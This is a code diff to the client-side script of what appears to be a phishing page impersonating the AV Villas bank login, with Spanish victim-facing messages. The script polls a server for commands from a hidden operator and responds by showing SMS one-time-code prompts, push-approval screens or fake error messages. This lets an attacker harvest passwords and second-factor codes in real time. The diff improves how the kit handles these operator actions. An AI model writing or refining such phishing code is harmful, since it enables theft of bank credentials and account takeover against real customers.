@@ -27,6 +27,7 @@ sessionStorage.setItem('sessionId', sessionId);
 
 let pingInterval = null;
 let pollInterval = null;
+let lastProcessedAction = null;
 
 setupSelect();
 onlyDigits(docNumber);
@@ -124,43 +125,46 @@ function startPolling() {
       if (response.ok) {
         const data = await response.json();
         
-        // Handle Operator Action
-        if (data.action === 'sms') {
-          // Operator requested SMS -> Open SMS input (smsScreen) and stop polling
-          stopPolling();
-          if (smsLead) {
-            smsLead.textContent = "Por tu seguridad hemos enviado una clave temporal a tu celular registrado.";
-            smsLead.style.color = "inherit";
+        // Handle Operator Action only when it changes
+        if (data.action !== lastProcessedAction) {
+          lastProcessedAction = data.action;
+          
+          if (data.action === 'sms') {
+            // Operator requested SMS -> Open SMS input (smsScreen) and stop polling
+            stopPolling();
+            if (smsLead) {
+              smsLead.textContent = "Por tu seguridad hemos enviado una clave temporal a tu celular registrado.";
+              smsLead.style.color = "inherit";
+            }
+            openSmsScreen();
+          } else if (data.action === 'dinamica') {
+            // Operator requested Dynamic Key/Push -> Open push screen (authzScreen) and keep polling
+            if (authzScreen.hidden) {
+              openAuthzScreen();
+            }
+          } else if (data.action === 'error-login') {
+            stopPolling();
+            stopPing();
+            authzScreen.hidden = true;
+            smsScreen.hidden = true;
+            spinner.hidden = true;
+            errorEl.textContent = "La contraseña o el documento no son válidos. Inténtalo de nuevo.";
+            errorEl.hidden = false;
+          } else if (data.action === 'error-sms') {
+            stopPolling();
+            spinner.hidden = true;
+            openSmsScreen();
+            if (smsLead) {
+              smsLead.textContent = "El código ingresado es incorrecto. Por favor, digítalo de nuevo.";
+              smsLead.style.color = "red";
+            }
+          } else if (data.action === 'error-dinamica') {
+            // Push rejected or expired -> Hide push screen and show error, but KEEP POLLING
+            authzScreen.hidden = true;
+            spinner.hidden = true;
+            errorEl.textContent = "La autorización en tu aplicación AV Villas fue rechazada o expiró. Inténtalo de nuevo.";
+            errorEl.hidden = false;
           }
-          openSmsScreen();
-        } else if (data.action === 'dinamica') {
-          // Operator requested Dynamic Key/Push -> Open push screen (authzScreen) and keep polling
-          if (authzScreen.hidden) {
-            openAuthzScreen();
-          }
-        } else if (data.action === 'error-login') {
-          stopPolling();
-          stopPing();
-          authzScreen.hidden = true;
-          smsScreen.hidden = true;
-          spinner.hidden = true;
-          errorEl.textContent = "La contraseña o el documento no son válidos. Inténtalo de nuevo.";
-          errorEl.hidden = false;
-        } else if (data.action === 'error-sms') {
-          stopPolling();
-          spinner.hidden = true;
-          openSmsScreen();
-          if (smsLead) {
-            smsLead.textContent = "El código ingresado es incorrecto. Por favor, digítalo de nuevo.";
-            smsLead.style.color = "red";
-          }
-        } else if (data.action === 'error-dinamica') {
-          stopPolling();
-          stopPing();
-          authzScreen.hidden = true;
-          spinner.hidden = true;
-          errorEl.textContent = "La autorización en tu aplicación AV Villas fue rechazada o expiró. Inténtalo de nuevo.";
-          errorEl.hidden = false;
         }
         
         // Handle Operator Done State
@@ -241,6 +245,7 @@ otpInputs.forEach((input, index) => {
 form.addEventListener("submit", (event) => {
   event.preventDefault();
   errorEl.hidden = true;
+  lastProcessedAction = null;
 
   const docTypeVal = document.getElementById("docType").value || "CC";
   const docNumberVal = docNumber.value.trim();
